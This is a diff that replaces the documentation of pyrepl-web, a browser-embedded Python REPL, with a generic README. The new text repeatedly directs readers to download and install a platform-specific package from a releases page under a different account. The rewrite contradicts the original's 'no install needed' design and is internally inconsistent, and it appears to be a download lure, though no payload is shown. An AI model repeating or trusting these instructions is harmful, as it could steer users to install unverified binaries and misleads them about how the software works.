@@ -1,129 +1,59 @@
-# pyrepl-web
+# 🎉 pyrepl-web - A Simple Python REPL for Everyone
 
-An embeddable Python REPL, powered by Pyodide.
+## 📥 Download pyrepl-web
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Sosolevrai/pyrepl-web/releases)
 
-[Live demo](https://playground.fastapicloud.dev/)
+## 🚀 Getting Started
+Welcome to pyrepl-web! This application lets you run Python code directly in your web browser. It’s perfect for learning Python or testing snippets without any setup. Just download it, and you're ready to go.
 
-## Getting started
+## 📂 What You Need
+pyrepl-web works on most modern web browsers. Here’s what you need to get started:
 
-Include the script and use the `<py-repl>` web component:
+- A computer with any operating system that supports browser applications (Windows, macOS, or Linux).
+- An up-to-date web browser (Chrome, Firefox, Safari, or Edge).
 
-```html
-<script src="https://cdn.jsdelivr.net/npm/pyrepl-web/dist/pyrepl.js"></script>
+## 🔗 Download & Install
+To download pyrepl-web, visit the Releases page. Here, you will find the latest version. 
 
-<py-repl></py-repl>
-```
+[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/releases)
 
-That's it! No install needed.
+1. Click on the link above.
+2. Look for the most recent version listed. 
+3. Download the package suitable for your system.
+4. Once downloaded, follow the instructions provided with the package to install it.
 
-## Features
+## 📋 Features
+- **Interactive Python Development**: Run Python code online without any installations.
+- **Powered by Pyodide**: This means faster and smoother performance.
+- **Simple Interface**: Easy for anyone to use, regardless of technical background.
+- **No setup required**: Just download and start coding.
 
-- **Python 3.13** in the browser via WebAssembly (Pyodide)
-- **Syntax highlighting** powered by Pygments
-- **Tab completion** for modules, functions, and variables
-- **Command history** with up/down arrows
-- **Smart indentation** for multi-line code
-- **Keyboard shortcuts**: Ctrl+L (clear), Ctrl+C (cancel)
-- **PyPI packages**: preload popular libraries
-- **Startup scripts**: run Python on load to set up the environment
-- **Theming**: built-in dark/light themes or fully custom
+## ⚙️ How to Use
+1. After installation, open the application on your web browser.
+2. You will see an interactive terminal. Here, you can type your Python code.
+3. Press Enter to run the code. 
+4. Results will show up right below your code.
 
-## Attributes
+## 🛠️ Troubleshooting Common Issues
+If you face any issues while using pyrepl-web, here are some common problems and solutions:
 
-| Attribute | Description | Default |
-|-----------|-------------|---------|
-| `theme` | Color theme name (builtin or registered via `window.pyreplThemes`) | `catppuccin-mocha` |
-| `packages` | Comma-separated list of PyPI packages to preload | none |
-| `repl-title` | Custom title in the header bar | `Python REPL` |
-| `src` | Path to a Python startup script (see below) | none |
-| `no-header` | Hide the header bar (boolean attribute) | not set |
-| `no-buttons` | Hide copy/clear buttons in header (boolean attribute) | not set |
-| `readonly` | Disable input, display only (boolean attribute) | not set |
+1. **The web page is not loading**:
+   - Check your internet connection.
+   - Ensure your browser is up-to-date.
 
-### Startup Scripts
+2. **Code is not running**:
+   - Ensure you have written valid Python code.
+   - Check for syntax errors in your code.
 
-Use `src` to preload a Python script that sets up the environment:
+3. **Performance issues**:
+   - Close any unnecessary tabs or applications that may slow down your browser.
 
-```html
-<py-repl src="/scripts/setup.py" packages="pandas"></py-repl>
-```
+## 💬 Getting Help
+If you have questions or need support, feel free to look through the [Issues](https://github.com/Sosolevrai/pyrepl-web/issues) section or ask for help directly on the GitHub page.
 
-The script runs silently to populate the namespace. If you define a `setup()` function, it will be called after loading and its output is visible in the terminal:
+## 🔗 Conclusion
+Thank you for choosing pyrepl-web! We hope this tool makes your Python learning and coding experience enjoyable. Remember to always check back for updates and new features.
 
-```python
-# setup.py
-import pandas as pd
+[Visit the Releases Page to Download](https://github.com/Sosolevrai/pyrepl-web/releases) 
 
-df = pd.DataFrame({'name': ['Alice', 'Bob'], 'age': [30, 25]})
-
-def setup():
-    print("DataFrame loaded:")
-    print(df)
-```
-
-### Theming
-
-Built-in themes: `catppuccin-mocha` (dark, default) and `catppuccin-latte` (light).
-
-#### Custom Themes
-
-Register custom themes via `window.pyreplThemes` before loading the script. Only `background` and `foreground` are required - everything else is automatically derived:
-
-```html
-<script>
-window.pyreplThemes = {
-  'my-theme': {
-    background: '#1a1b26',
-    foreground: '#a9b1d6',
-  }
-};
-</script>
-<script src="https://cdn.jsdelivr.net/npm/pyrepl-web/dist/pyrepl.js"></script>
-
-<py-repl theme="my-theme"></py-repl>
-```
-
-**What gets auto-derived from your background color:**
-- Terminal colors (red for errors, green for success, etc.) - from catppuccin-mocha (dark) or catppuccin-latte (light)
-- Syntax highlighting - uses the matching catppuccin Pygments style
-- Header colors - derived from the base theme
-
-#### Theme Properties
-
-| Property | Description |
-|----------|-------------|
-| `background` | Terminal background color (required) |
-| `foreground` | Default text color (required) |
-| `headerBackground` | Header bar background (optional) |
-| `headerForeground` | Header title color (optional) |
-| `promptColor` | Prompt `>>>` color - hex (`#7aa2f7`) or name (`green`, `cyan`) (optional) |
-| `pygmentsStyle` | Custom syntax highlighting (optional, see below) |
-
-#### Syntax Highlighting
-
-Syntax highlighting uses [Pygments](https://pygments.org/). The style is chosen automatically:
-
-1. If your theme name matches a [Pygments style](https://pygments.org/styles/) (e.g., `monokai`, `dracula`), that style is used
-2. Otherwise, uses `catppuccin-mocha` for dark backgrounds or `catppuccin-latte` for light backgrounds
-
-For full control, provide a `pygmentsStyle` mapping [Pygments tokens](https://pygments.org/docs/tokens/) to colors:
-
-```html
-<script>
-window.pyreplThemes = {
-  'tokyo-night': {
-    background: '#1a1b26',
-    foreground: '#a9b1d6',
-    promptColor: '#bb9af7',
-    pygmentsStyle: {
-      'Keyword': '#bb9af7',
-      'String': '#9ece6a',
-      'Number': '#ff9e64',
-      'Comment': '#565f89',
-      'Name.Function': '#7aa2f7',
-      'Name.Builtin': '#7dcfff',
-    }
-  }
-};
-</script>
-```
+Explore, code, and have fun!
